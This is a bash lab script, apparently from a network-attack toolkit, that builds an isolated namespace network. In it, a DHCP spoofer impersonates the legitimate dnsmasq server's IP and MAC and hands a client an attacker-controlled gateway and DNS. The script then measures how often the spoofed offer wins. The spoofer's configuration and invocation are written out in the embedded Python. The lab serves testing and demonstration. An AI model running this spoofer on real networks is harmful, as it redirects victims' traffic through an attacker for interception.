#!/usr/bin/env bash
# Isolated DHCP spoofing lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCP server (10.99.0.1, pool 10.99.0.100-119,
#             router 10.99.0.1). Its MAC is copied by the attacker.
#   attacker: MACabre's DHCP spoofer. It answers the client in the name of the server
#             (10.99.0.1 and the server's MAC), with the attacker as gateway and DNS
#             (10.99.0.250), and only for the client's MAC.
#   client:   a DHCP client that runs five full handshakes (DISCOVER, OFFER,
#             REQUEST, ACK) and records which offer arrived first, and which gateway it
#             carried.
#
#   Phase 1 (baseline): only the legitimate server runs. Every offer names 10.99.0.1
#            as gateway.
#   Phase 2 (race): the legitimate server and the spoofer both run.
#   Phase 3 (alone): the legitimate server is stopped. The spoofer answers as the server.
#
# A spoofed offer is recognized by its gateway (10.99.0.250). The client takes the first
# offer, as most clients do.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/dhcp_spoofing_lab.sh
#   sudo ROUNDS=10 scripts/lab/dhcp_spoofing_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ROUNDS="${ROUNDS:-5}"
ATTACK_SECONDS=30
CLIENT_MAC="02:00:00:00:00:50"
SPOOF_ROUTER="10.99.0.250"
LEGIT_IP="10.99.0.1"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

# Each host has a veth to a port of the LAN bridge.
for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set lo up
ip netns exec server ip addr add "$LEGIT_IP/24" dev h-srv
ip netns exec server ip link set h-srv up
ip netns exec attacker ip link set h-att up
ip netns exec client ip link set h-cli address "$CLIENT_MAC"
ip netns exec client ip link set h-cli up

LEGIT_MAC="$(ip netns exec server ip -o link show h-srv | grep -o 'link/ether [0-9a-f:]*' | awk '{print $2}')"

ip netns exec server dnsmasq \
    --keep-in-foreground \
    --interface=h-srv \
    --bind-interfaces \
    --port=0 \
    --conf-file=/dev/null \
    --dhcp-authoritative \
    --no-ping \
    --dhcp-range=10.99.0.100,10.99.0.119,12h \
    --dhcp-leasefile="$WORK/leases" \
    --log-dhcp \
    --log-facility="$LOG" &
sleep 2

SPOOF_CODE='
import os, threading
from macabre.attacks.dhcp_spoofing import DhcpSpoofingConfig, run_dhcp_spoofing
stop = threading.Event()
threading.Timer(float(os.environ["ATTACK_SECONDS"]), stop.set).start()
stats = run_dhcp_spoofing(
    DhcpSpoofingConfig(
        iface="h-att",
        server_ip="10.99.0.1",
        server_mac=os.environ["LEGIT_MAC"],
        offer_ip="10.99.0.200",
        router="10.99.0.250",
        dns="10.99.0.250",
        target_mac=os.environ["CLIENT_MAC"],
    ),
    stop,
    lambda _: None,
)
print(f"Spoofer: sent {stats.offers} offers and {stats.acks} acks as 10.99.0.1")
'

# A client that runs full handshakes and reports which server answered first and acked.
CLIENT_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp, BOOTP, DHCP
from macabre.attacks.dhcp_starvation import build_discover, build_request

MAC = os.environ["CLIENT_MAC"]
ROUNDS = int(os.environ["ROUNDS"])
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP) and pkt[BOOTP].op == 2:
        seen.append(pkt)

def options(pkt):
    return {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}

def mtype(pkt):
    return options(pkt).get("message-type")

sniffer = AsyncSniffer(iface="h-cli", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)
first_offer_spoof = 0
acked_spoof = 0
for n in range(1, ROUNDS + 1):
    xid = rng.getrandbits(32)
    seen.clear()
    sendp(build_discover(MAC, xid), iface="h-cli", verbose=False)
    time.sleep(1.5)
    offers = [p for p in seen if p[BOOTP].xid == xid and mtype(p) == 2]
    if not offers:
        print(f"round {n}: no offer")
        continue
    first = offers[0]
    opts = options(first)
    server = opts.get("server_id")
    router = opts.get("router")
    yiaddr = first[BOOTP].yiaddr
    if router == "10.99.0.250":
        first_offer_spoof += 1
    seen.clear()
    sendp(build_request(MAC, xid, yiaddr, server), iface="h-cli", verbose=False)
    time.sleep(1.5)
    acks = [p for p in seen if p[BOOTP].xid == xid and mtype(p) == 5]
    ack_server = options(acks[0]).get("server_id") if acks else None
    if ack_server == "10.99.0.1" and router == "10.99.0.250":
        acked_spoof += 1
    ack_text = ack_server or "none"
    if router == "10.99.0.250":
        ack_text = ack_text + " (spoofed gateway)"
    print(f"round {n}: first offer from {server} (router {router}, address {yiaddr}); ack from {ack_text}")
sniffer.stop()
print(f"Client: first offer from the spoofer in {first_offer_spoof} of {ROUNDS} rounds; ack from the spoofer in {acked_spoof} of {ROUNDS}")
'

run_client() {
    ip netns exec client env PYTHONPATH="$ROOT/src" CLIENT_MAC="$CLIENT_MAC" ROUNDS="$ROUNDS" "$PY" -c "$CLIENT_CODE"
}

echo "Phase 1: baseline, legitimate server only ($ROUNDS rounds)"
run_client | tee "$WORK/baseline.txt"
echo

echo "Phase 2: spoofer and legitimate server both running for ${ATTACK_SECONDS}s ($ROUNDS rounds)"
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" LEGIT_MAC="$LEGIT_MAC" CLIENT_MAC="$CLIENT_MAC" "$PY" -c "$SPOOF_CODE" &
ROGUE_PID=$!
sleep 2
run_client | tee "$WORK/race.txt"
wait "$ROGUE_PID"
echo

echo "Phase 3: legitimate server stopped (down or pool exhausted), spoofer running for ${ATTACK_SECONDS}s ($ROUNDS rounds)"
for pid in $(ip netns pids server 2>/dev/null || true); do
    kill "$pid" 2>/dev/null || true
done
sleep 2
ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" LEGIT_MAC="$LEGIT_MAC" CLIENT_MAC="$CLIENT_MAC" "$PY" -c "$SPOOF_CODE" &
ROGUE_PID=$!
sleep 2
run_client | tee "$WORK/alone.txt"
wait "$ROGUE_PID"
echo

SPOOF_FIRST_BASE="$(grep -c 'router 10.99.0.250' "$WORK/baseline.txt" || true)"
RACE_SPOOF="$(grep -c 'router 10.99.0.250' "$WORK/race.txt" || true)"
ALONE_SPOOF="$(grep -c 'router 10.99.0.250' "$WORK/alone.txt" || true)"
ALONE_ACK="$(grep -c 'ack from 10.99.0.1 (spoofed gateway)' "$WORK/alone.txt" || true)"

if (( SPOOF_FIRST_BASE == 0 )); then
    echo "Baseline: every first offer named the legitimate gateway. OK"
else
    echo "Baseline: $SPOOF_FIRST_BASE offers carried the spoofed gateway before the attack. Result unreliable."
fi
echo "Race: with both servers running, the client's first offer carried the spoofed gateway in $RACE_SPOOF of $ROUNDS rounds. In this lab the legitimate server answers first."
if (( ALONE_SPOOF > 0 )); then
    echo "Alone: with the legitimate server stopped, the client took the spoofed offer in $ALONE_SPOOF of $ROUNDS rounds. It was acknowledged as 10.99.0.1 with the spoofed gateway in $ALONE_ACK. Vulnerable."
else
    echo "Alone: the client never took the spoofed offer. Result unreliable."
fi
